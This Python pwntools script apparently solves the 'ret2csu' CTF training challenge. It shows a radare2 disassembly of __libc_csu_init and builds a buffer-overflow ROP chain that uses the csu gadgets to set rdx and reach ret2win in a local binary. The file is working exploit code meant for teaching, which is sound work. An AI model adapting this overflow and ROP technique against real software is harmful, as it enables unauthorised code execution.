from pwn import * 

"""
[0x004005f0]> pdf @sym.__libc_csu_init
/ (fcn) sym.__libc_csu_init 92
|   sym.__libc_csu_init (int arg1, int arg2, int arg3);
|           ; arg int arg1 @ rdi
|           ; arg int arg2 @ rsi
|           ; arg int arg3 @ rdx
|           ; DATA XREF from entry0 (0x400606)
|           0x00400840      4157           push r15
|           0x00400842      4156           push r14
|           0x00400844      4989d7         mov r15, rdx                ; arg3
|           0x00400847      4155           push r13
|           0x00400849      4154           push r12
|           0x0040084b      4c8d25be0520.  lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start ; 0x600e10
|           0x00400852      55             push rbp
|           0x00400853      488d2dbe0520.  lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end ; 0x600e18
|           0x0040085a      53             push rbx
|           0x0040085b      4189fd         mov r13d, edi               ; arg1
|           0x0040085e      4989f6         mov r14, rsi                ; arg2
|           0x00400861      4c29e5         sub rbp, r12
|           0x00400864      4883ec08       sub rsp, 8
|           0x00400868      48c1fd03       sar rbp, 3
|           0x0040086c      e8effcffff     call sym._init
|           0x00400871      4885ed         test rbp, rbp
|       ,=< 0x00400874      7420           je 0x400896
|       |   0x00400876      31db           xor ebx, ebx
|       |   0x00400878      0f1f84000000.  nop dword [rax + rax]
|       |   ; CODE XREF from sym.__libc_csu_init (+0x54)
|      .--> 0x00400880      4c89fa         mov rdx, r15
|      :|   0x00400883      4c89f6         mov rsi, r14
|      :|   0x00400886      4489ef         mov edi, r13d
|      :|   0x00400889      41ff14dc       call qword [r12 + rbx*8]
..
|       |   ; CODE XREF from sym.__libc_csu_init (0x400874)
|       `-> 0x00400896      4883c408       add rsp, 8
|           0x0040089a      5b             pop rbx
|           0x0040089b      5d             pop rbp
|           0x0040089c      415c           pop r12
|           0x0040089e      415d           pop r13
|           0x004008a0      415e           pop r14
|           0x004008a2      415f           pop r15
\\           0x004008a4      c3             ret
[0x004005f0]> 

0x600e10 + 0 * 8 = 0x004006d0
"""
"""
Note:

JMP performs a jump to a memory location
CALL pushes the current instruction pointer on the stack (rather: one after the current instruction), and then JMPs to the location. Using a RET you can get back to where you were.
"""
def chain():

	chain = "A" * 40
	chain += p64(0x40089a) 
	chain += p64(0x0) # pop rbx
	chain += p64(0x1) # pop rbp
	chain += p64(0x600e38) # pop r12
	chain += p64(0x0) # pop r13
	chain += p64(0x0) # pop r14
	chain += p64(0xdeadcafebabebeef) # pop r15
	chain += p64(0x400880) # mov rdx, r15
	chain += p64(0x0) # padding
	chain += p64(0x0) # padding
	chain += p64(0x0) # padding
	chain += p64(0x0) # padding
	chain += p64(0x0) # padding
	chain += p64(0x0) # padding
	chain += p64(0x0) # padding
	chain += p64(0x4007b1) # ret2win()

	return chain

def exploit():

	#p = process('./ret2csu')
	p = gdb.debug('./ret2csu', 'b *0x400880')
	context(os='linux', arch='amd64')
	#context.log_level = 'DEBUG'

	log.success("Sending Exploit")
	p.recvuntil(">")
	p.sendline(chain())
	output = p.readall()
	print(output)

exploit()